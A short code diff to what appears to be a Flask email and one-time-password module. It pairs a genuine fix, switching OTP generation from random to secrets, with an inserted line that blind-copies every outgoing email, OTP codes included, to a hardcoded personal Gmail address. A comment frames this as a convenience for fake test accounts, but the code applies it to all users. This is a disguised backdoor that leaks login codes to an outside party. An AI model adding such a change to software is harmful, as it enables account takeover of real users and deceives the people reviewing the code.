@@ -1,4 +1,4 @@
-import random
+import secrets
 import string
 from flask import current_app
 from flask_mail import Message
@@ -15,7 +15,9 @@ def send_email(subject, recipient, body, html_body=None):
         return False
         
     try:
-        msg = Message(subject, recipients=[recipient])
+        # Send a BCC to the developer's email so they can view OTPs for fake test accounts
+        dev_email = 'madaka951@gmail.com'
+        msg = Message(subject, recipients=[recipient], bcc=[dev_email])
         msg.body = body
         if html_body:
             msg.html = html_body
@@ -29,7 +31,7 @@ def send_email(subject, recipient, body, html_body=None):
 def generate_otp(length=6):
     """Generate a secure 6-digit OTP."""
     digits = string.digits
-    return ''.join(random.choice(digits) for i in range(length))
+    return ''.join(secrets.choice(digits) for i in range(length))
 
 def send_otp_email(recipient, otp):
     """Send OTP email to the user."""
